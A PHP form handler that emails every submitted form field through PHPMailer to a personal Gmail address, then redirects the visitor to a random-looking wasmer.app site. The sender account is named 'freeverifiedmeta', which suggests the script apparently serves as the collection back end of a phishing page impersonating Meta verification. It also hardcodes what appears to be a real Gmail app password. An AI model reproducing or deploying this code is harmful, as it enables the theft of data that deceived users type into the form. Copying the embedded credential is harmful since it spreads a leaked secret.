<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'Exception.php';
require 'PHPMailer.php';
require 'SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Form data collect karna
    $emailBody = '';
    foreach ($_POST as $key => $value) {
        $emailBody .= '<b>' . ucfirst(htmlspecialchars($key)) . ':</b> ' . htmlspecialchars($value) . '<br>';
    }

    $mail = new PHPMailer(true);

    try {
        // SMTP Settings
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'freeverifiedmeta@gmail.com'; 
        $mail->Password   = 'dtxm iggc axzz nkqs'; // Yahan apna 16-digit Gmail App Password dalein
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS; 
        $mail->Port       = 587;

        // Email Headers & Recipients
        $mail->setFrom('freeverifiedmeta@gmail.com', 'Form Notification');
        $mail->addAddress('alibrohi883@gmail.com');

        // Content
        $mail->isHTML(true);
        $mail->Subject = 'New Form Submission';
        $mail->Body    = $emailBody;

        // Send Email
        $mail->send();

        // Email bhejne ke BAAD redirect karein
        header("Location: https://fdfdfdcvxc.wasmer.app/");
        exit();

    } catch (Exception $e) {
        echo "Email sending failed. Error: {$mail->ErrorInfo}";
    }
} else {
    echo "Invalid request method.";
}
?>
